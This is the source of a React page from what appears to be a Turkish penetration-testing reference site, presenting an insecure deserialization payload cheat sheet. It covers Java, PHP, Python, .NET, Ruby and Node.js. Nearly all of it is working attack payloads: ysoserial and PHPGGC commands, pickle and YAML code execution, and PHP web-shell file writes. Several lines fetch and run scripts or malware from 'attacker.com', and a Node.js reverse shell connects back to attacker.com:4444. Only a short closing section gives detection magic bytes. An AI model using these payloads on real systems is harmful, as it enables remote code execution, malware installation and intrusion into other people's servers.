"use client"

import { motion } from "framer-motion"
import { Globe, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function DeserializationPage() {
  return (
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-blue-400 text-sm font-medium mb-4">
          <Globe className="w-4 h-4" />
          <span>Web Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">Insecure Deserialization</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          Güvenilmeyen veriyi deserialize etmek RCE, DoS ve authentication bypass&apos;a yol açabilir.
          Java, PHP, Python, Ruby ve .NET ortamlarında yaygındır.
        </p>
      </motion.div>

      <Callout type="danger" title="Kritik Risk">
        Insecure deserialization genellikle Remote Code Execution (RCE) ile sonuçlanır.
        Bu zafiyetler kritik öncelikle ele alınmalıdır.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Java Deserialization</h2>
        <PayloadList
          title="Java Serial Payloads"
          initialShow={5}
          payloads={[
            { code: `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...`, note: "Base64 encoded Java serialized object - ysoserial ile oluştur" },
            { code: `AC ED 00 05 (hex header)`, note: "Java serialized object magic bytes" },
            { code: `java -jar ysoserial.jar CommonsCollections1 'whoami' | base64`, note: "ysoserial ile RCE payload" },
            { code: `java -jar ysoserial.jar CommonsCollections5 'curl attacker.com/shell.sh|bash'`, note: "Reverse shell payload" },
            { code: `java -jar ysoserial.jar CommonsCollections6 'wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m'`, note: "Malware download" },
            { code: `java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net'`, note: "Blind detection - DNS callback" },
            { code: `java -jar ysoserial.jar JRMPClient 'attacker.com:1099'`, note: "JRMP listener callback" },
            { code: `java -jar ysoserial.jar Jdk7u21 'calc.exe'`, note: "JDK 7u21 gadget chain" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">PHP Deserialization</h2>
        <PayloadList
          title="PHP Object Injection"
          initialShow={8}
          payloads={[
            { code: `O:8:"stdClass":1:{s:4:"test";s:5:"value";}`, note: "Temel PHP serialized object" },
            { code: `a:2:{i:0;s:4:"test";i:1;s:5:"value";}`, note: "PHP serialized array" },
            { code: `O:14:"Authentication":1:{s:7:"isAdmin";b:1;}`, note: "Auth bypass - isAdmin=true" },
            { code: `O:4:"User":2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}`, note: "Role manipulation" },
            { code: `O:8:"SomeClass":1:{s:4:"file";s:11:"/etc/passwd";}`, note: "__destruct ile file read" },
            { code: `O:8:"LogClass":1:{s:4:"file";s:25:"/var/www/html/shell.php";s:4:"data";s:30:"<?php system($_GET['cmd']); ?>";}`, note: "File write RCE" },
            { code: `O:7:"Archive":1:{s:4:"path";s:18:"phar://./shell.jpg";}`, note: "Phar deserialization" },
            { code: `php://filter/convert.base64-decode/resource=data://text/plain;base64,PAYLOAD`, note: "Filter chain RCE" },
            { code: `a:2:{i:0;O:9:"Exception":1:{s:7:"message";s:7:"pwned!!";}i:1;s:4:"test";}`, note: "Exception object" },
          ]}
        />

        <PayloadList
          title="PHPGGC Payloads"
          initialShow={5}
          payloads={[
            { code: `./phpggc Laravel/RCE1 system 'id'`, note: "Laravel RCE" },
            { code: `./phpggc Symfony/RCE4 exec 'whoami'`, note: "Symfony RCE" },
            { code: `./phpggc Monolog/RCE1 system 'cat /etc/passwd'`, note: "Monolog RCE" },
            { code: `./phpggc Guzzle/FW1 /var/www/html/shell.php /tmp/shell.php`, note: "Guzzle file write" },
            { code: `./phpggc Doctrine/FW1 /tmp/shell.php '<?php system($_GET["c"]); ?>'`, note: "Doctrine file write" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Python Deserialization</h2>
        <PayloadList
          title="Python Pickle"
          initialShow={5}
          payloads={[
            { code: `import pickle
import os
class Evil:
    def __reduce__(self):
        return (os.system, ('whoami',))
pickle.dumps(Evil())`, note: "__reduce__ ile RCE" },
            { code: `cos
system
(S'id'
tR.`, note: "Raw pickle opcode - id command" },
            { code: `(cos
system
S'curl attacker.com/shell.sh|bash'
o.`, note: "Reverse shell pickle" },
            { code: `import pickle, base64
payload = b"cos\\nsystem\\n(S'id'\\ntR."
print(base64.b64encode(payload).decode())`, note: "Base64 encoded pickle" },
            { code: `import yaml
yaml.load('!!python/object/apply:os.system ["id"]')`, note: "PyYAML RCE - unsafe load" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">.NET Deserialization</h2>
        <PayloadList
          title=".NET Payloads"
          initialShow={5}
          payloads={[
            { code: `ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"`, note: "BinaryFormatter gadget" },
            { code: `ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"`, note: "WindowsIdentity gadget" },
            { code: `ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"`, note: "Json.Net gadget" },
            { code: `ysoserial.exe -g PSObject -f BinaryFormatter -c "powershell -e BASE64"`, note: "PowerShell execution" },
            { code: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}`, note: "Json.Net TypeNameHandling RCE" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Ruby Deserialization</h2>
        <PayloadList
          title="Ruby Marshal"
          initialShow={4}
          payloads={[
            { code: `Marshal.dump(ERB.new("<%= system('id') %>").result)`, note: "ERB template RCE" },
            { code: `Gem::Requirement.new(Gem::DependencyList.new.tap{|x| x.instance_variable_set(:@specs,[Gem::Source.new("| id")])})`, note: "Gem gadget chain" },
            { code: `require 'yaml'
YAML.load('--- !ruby/object:Gem::Installer\ni: x')`, note: "YAML unsafe load" },
            { code: `!!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source
    current_fetch_uri: "| id"`, note: "YAML RCE payload" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Node.js Deserialization</h2>
        <PayloadList
          title="Node.js Payloads"
          initialShow={5}
          payloads={[
            { code: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`, note: "node-serialize RCE" },
            { code: `{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('cat /etc/passwd').toString()}()"}`, note: "Sync execution" },
            { code: `_$$ND_FUNC$$_function(){var net=require('net'),sh=require('child_process').spawn('/bin/sh',[]);var client=new net.Socket();client.connect(4444,'attacker.com',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});}()`, note: "Reverse shell" },
            { code: `{"exploit":"_$$ND_FUNC$$_require('child_process').exec('curl attacker.com/shell.sh|bash')"}`, note: "Curl based reverse shell" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Tespit İpuçları</h2>
        <Callout type="info" title="Magic Bytes">
          Java: AC ED 00 05 veya rO0AB (base64)
          .NET BinaryFormatter: 00 01 00 00 00 FF FF FF FF
          PHP: O: veya a: ile başlar
          Python Pickle: 80 04 95 veya cos, cposix
        </Callout>
      </motion.section>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/web/xxe" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>XXE</span>
        </Link>
        <Link href="/docs/web/file-upload" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>File Upload</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
  )
}
